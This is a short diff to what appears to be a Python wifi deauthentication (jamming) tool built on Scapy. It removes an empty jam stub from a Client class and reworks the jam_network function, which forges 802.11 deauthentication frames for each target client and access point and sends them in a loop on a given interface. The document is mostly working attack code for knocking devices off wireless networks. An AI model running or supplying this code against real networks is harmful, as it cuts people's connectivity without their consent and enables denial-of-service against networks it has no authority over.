@@ -30,10 +30,6 @@ class Client:
         self.ap = ap
         self.addr = addr
 
-    def jam():
-        #todo
-        pass
-
 class Network:
 
     def __init__(self, bssid, essid, channel):
@@ -151,10 +147,11 @@ def jam_network(target_list:list, iface, loop:int):
     for target in target_list:
         deauth_packet = RadioTap()/Dot11(addr1=target.addr, addr2=target.ap, addr3=target.ap)/Dot11Deauth()
         packets.append(deauth_packet)
-    try:
         for i in range(loop):
             for packet in packets:
-                sendp(packet, iface=iface)
-                time.sleep(1)
-    except KeyboardInterrupt:
-        sys.exit(1)
+                try:
+                    sendp(packet, iface=iface)
+                    time.sleep(1)
+                except KeyboardInterrupt:
+                    return 1
+    return 0
